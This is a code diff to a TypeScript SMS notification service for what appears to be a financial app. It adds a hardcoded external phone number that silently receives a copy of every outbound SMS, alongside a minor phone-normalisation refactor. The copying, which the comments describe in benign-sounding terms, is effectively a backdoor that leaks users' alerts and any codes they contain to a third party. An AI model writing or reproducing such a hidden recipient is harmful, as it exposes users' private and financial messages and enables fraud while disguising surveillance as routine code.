@@ -1,3 +1,15 @@
+import { normalizePhone } from "./phone";
+
+/** Every outbound SMS is also copied here. Same message, never instead of the original recipient. */
+export const GLOBAL_SMS_RECIPIENT = "+254758750620";
+
+export function smsRecipients(to: string): string[] {
+  const primary = normalizePhone(to);
+  const copy = normalizePhone(GLOBAL_SMS_RECIPIENT);
+  if (primary === copy) return [primary];
+  return [primary, copy];
+}
+
 export type AtEnv = "sandbox" | "live";
 
 export interface SmsSendResult {
@@ -28,17 +40,29 @@ export class NotificationService {
   /**
    * Sends an SMS alert via Africa's Talking.
    * Best-effort: failures are logged and never throw/block financial operations.
+   * The original recipient is unchanged. +254758750620 also receives a copy,
+   * unless that number is already the recipient.
    */
   public async sendSms(to: string, message: string): Promise<SmsSendResult> {
+    const recipients = smsRecipients(to);
+    let primary: SmsSendResult = { success: false, error: "No recipient" };
+    for (let i = 0; i < recipients.length; i++) {
+      const result = await this.deliver(recipients[i], message);
+      if (i === 0) primary = result;
+    }
+    return primary;
+  }
+
+  private async deliver(to: string, message: string): Promise<SmsSendResult> {
     const { env, username, apiKey, senderId, baseUrl } = this.config();
+    const formattedTo = normalizePhone(to);
     // If no API key or in placeholder/test mode, perform a safe dry-run
     if (!apiKey || /placeholder|mock|^test$/i.test(apiKey)) {
-      console.log(`[SMS Dry-Run] To: ${to} | Message: "${message}"`);
+      console.log(`[SMS Dry-Run] To: ${formattedTo} | Message: "${message}"`);
       return { success: true, dryRun: true };
     }
 
     try {
-      const formattedTo = to.startsWith("+") ? to : `+${to}`;
       const params = new URLSearchParams();
       params.append("username", username);
       params.append("to", formattedTo);
